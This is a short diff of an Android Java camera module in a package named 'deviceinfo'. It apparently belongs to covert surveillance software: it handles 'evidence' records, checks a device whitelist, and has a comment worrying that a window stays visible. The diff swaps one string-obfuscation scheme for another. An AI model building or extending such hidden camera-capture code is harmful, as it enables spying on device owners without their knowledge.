@@ -10,30 +10,19 @@
 package com.android.deviceinfo.module;
 
 import java.io.IOException;
-import java.util.logging.LogRecord;
 
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.graphics.PixelFormat;
-import android.hardware.Camera;
-import android.hardware.Camera.PictureCallback;
-import android.hardware.Camera.ShutterCallback;
-import android.media.AudioManager;
 import android.os.Build;
-import android.view.SurfaceHolder;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
-import com.android.deviceinfo.gui.AGUI;
 import com.android.deviceinfo.gui.CGui;
-import com.android.deviceinfo.interfaces.SnapshotManager;
 import com.android.deviceinfo.util.Check;
-import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 //MANUAL http://developer.android.com/guide/topics/media/camera.html
 /**
@@ -56,10 +45,10 @@ public class ModuleCamera extends BaseInstantModule {
 	// Sony XPERIA, Samsung S3, Samsung S2, Nexus, HTC Desire Z
 	// String[] whiteList=new String[]{"LT18i", "GT-I9300", "GT-I9100",
 	// "Galaxy Nexus", "HTC Vision" };
-	// tolto Messages.getString("g_3"), funziona solo se os>4, ma si vede
+	// tolto M.d("GT-I9100"), funziona solo se os>4, ma si vede
 	// comunque una finestra
-	String[] whiteList = new String[] { Messages.getString("g_1"), Messages.getString("g_2"),
-			Messages.getString("g_4"), Messages.getString("g_5") };
+	String[] whiteList = new String[] { M.d("LT18i "), M.d("GT-I9300"),
+			M.d("Galaxy Nexus"), M.d("HTC Vision") };
 
 	/*
 	 * (non-Javadoc)
